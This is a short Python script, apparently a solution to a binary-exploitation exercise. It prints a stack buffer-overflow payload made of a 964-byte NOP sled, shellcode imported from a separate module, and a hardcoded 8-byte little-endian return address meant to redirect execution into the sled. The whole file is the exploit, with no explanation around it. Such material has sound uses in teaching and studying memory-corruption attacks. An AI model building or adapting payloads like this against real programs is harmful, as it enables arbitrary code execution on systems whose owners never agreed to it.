#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'\x90'*964)
sys.stdout.buffer.write(shellcode)

#padding = 1024 - 256 - len(shellcode)
sys.stdout.buffer.write(0x7ffffff6acb8.to_bytes(8, "little"))
